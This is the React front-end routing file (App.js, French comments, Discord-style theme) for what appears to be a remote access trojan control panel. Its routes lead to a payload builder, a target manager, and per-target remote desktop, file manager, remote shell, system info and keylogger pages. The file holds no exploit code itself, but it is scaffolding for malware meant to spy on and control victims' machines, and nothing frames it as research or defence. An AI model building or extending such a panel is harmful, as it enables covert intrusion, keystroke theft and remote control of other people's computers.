import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import { Toaster } from 'react-hot-toast';
import Login from './components/Login';
import Register from './components/Register';
import Dashboard from './components/Dashboard';
import Layout from './components/Layout';
import PayloadBuilder from './components/PayloadBuilder';
import TargetsManager from './components/TargetsManager';
import RemoteDesktop from './components/RemoteDesktop';
import FileManager from './components/FileManager';
import RemoteShell from './components/RemoteShell';
import SystemInfo from './components/SystemInfo';
import Keylogger from './components/Keylogger';
import Settings from './components/Settings';
import { AuthProvider, useAuth } from './context/AuthContext';

function AppRoutes() {
  const { user, loading } = useAuth();

  // 🚨 BYPASS LOGIN ACTIVÉ - Utilisateur connecté automatiquement
  console.log('🔄 AppRoutes render - user:', user, 'loading:', loading);

  // Forcer l'affichage après un court délai si loading reste true
  const [forceRender, setForceRender] = useState(false);
  
  useEffect(() => {
    const timer = setTimeout(() => {
      console.log('⏰ Timer expired, forcing render');
      setForceRender(true);
    }, 2000);
    
    return () => clearTimeout(timer);
  }, []);

  if (loading && !forceRender) {
    console.log('📱 Showing loading screen');
    return (
      <div className="min-h-screen bg-discord-darkest flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-discord-blurple mx-auto mb-4"></div>
          <p className="text-discord-light">Chargement...</p>
        </div>
      </div>
    );
  }

  console.log('📱 Showing main app interface');
  return (
    <div className="min-h-screen bg-discord-darkest">
      <Routes>
        {!user ? (
          <>
            <Route path="/login" element={<Login />} />
            <Route path="/register" element={<Register />} />
            <Route path="*" element={<Navigate to="/login" replace />} />
          </>
        ) : (
          <Route path="/*" element={<Layout />}>
            <Route index element={<Dashboard />} />
            <Route path="dashboard" element={<Dashboard />} />
            <Route path="payload-builder" element={<PayloadBuilder />} />
            <Route path="targets" element={<TargetsManager />} />
            <Route path="remote-desktop/:targetId" element={<RemoteDesktop />} />
            <Route path="file-manager/:targetId" element={<FileManager />} />
            <Route path="remote-shell/:targetId" element={<RemoteShell />} />
            <Route path="system-info/:targetId" element={<SystemInfo />} />
            <Route path="keylogger/:targetId" element={<Keylogger />} />
            <Route path="settings" element={<Settings />} />
            <Route path="*" element={<Navigate to="/dashboard" replace />} />
          </Route>
        )}
      </Routes>
      <Toaster
        position="top-right"
        toastOptions={{
          duration: 4000,
          style: {
            background: '#36393F',
            color: '#DCDDDE',
            border: '1px solid #4F545C',
          },
          success: {
            iconTheme: {
              primary: '#57F287',
              secondary: '#36393F',
            },
          },
          error: {
            iconTheme: {
              primary: '#ED4245',
              secondary: '#36393F',
            },
          },
        }}
      />
    </div>
  );
}

function App() {
  return (
    <AuthProvider>
      <Router>
        <AppRoutes />
      </Router>
    </AuthProvider>
  );
}

export default App;